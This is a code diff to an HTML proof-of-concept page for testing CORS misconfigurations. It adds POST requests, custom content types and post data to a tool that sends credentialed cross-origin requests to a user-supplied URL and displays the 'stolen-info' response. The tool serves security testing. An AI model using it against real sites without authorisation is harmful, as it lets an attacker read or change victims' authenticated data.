@@ -1,3 +1,4 @@
+
 <!doctype html>
 <html lang="en">
 <head>
@@ -18,7 +19,10 @@ This is a PoC to demonstrate a CORS misconfiguration vulnerability on <code id="
 <pre>
 <form id="settings" name="settings">
 URL: <input type="text" placeholder="https://example.com" name="url" size="100"><br />
+Custom content type (optional): <input type="text" placeholder="text/plain" name="contenttype" size="100"><br />
 <input type="checkbox" name="authenticated"/> Send CORS with authentication cookies<br />
+<input type="checkbox" name="postreq"/> POST request<br />
+Post data: <input type="text" placeholder="test=demo" name="postdata" size="100"><br />
 <button id="btn-send" class="btn btn-info">Send CORS request</button>
 </form>
 </pre>
@@ -41,7 +45,10 @@ function parseConfig() {
   if(config.url.indexOf('http') !== 0) { config.url = ""; }
 
   document.forms.settings.url.value = config.url;
+  document.forms.settings.postdata.value = config.postdata;
+  document.forms.settings.contenttype.value = config.contenttype;
   document.forms.settings.authenticated.checked = config.authenticated ? "checked" : "";
+  document.forms.settings.postreq.checked = config.post ? "checked" : "";
   url = new URL(config.url);
   document.getElementById("url").textContent = url.hostname;
  } catch(e) {
@@ -56,7 +63,10 @@ function htmlEntities(str) {
 function saveConfig() {
   config = {
    'url': document.forms.settings.url.value,
-   'authenticated': document.forms.settings.authenticated.checked
+   'contenttype': document.forms.settings.contenttype.value,
+   'postdata': document.forms.settings.postdata.value,
+   'authenticated': document.forms.settings.authenticated.checked,
+   'post': document.forms.settings.postreq.checked
   }
   history.replaceState(undefined, undefined, '#'+btoa(JSON.stringify(config)));
   parseConfig();
@@ -70,9 +80,14 @@ function sendCORS(e) {
       document.getElementById("stolen-info").innerHTML = htmlEntities(this.responseText);
     }
   };
-  xhttp.open("GET", url, true);
+  var method = config.post ? "POST" : "GET";
+  xhttp.open(method, url, true);
+  if(config.contenttype) {
+  xhttp.setRequestHeader('Content-type', config.contenttype);
+  }
   xhttp.withCredentials = config.authenticated;
-  xhttp.send();
+  if (method === "GET") xhttp.send();
+  if (method === "POST") xhttp.send(config.postdata);
   return false;
 }
 
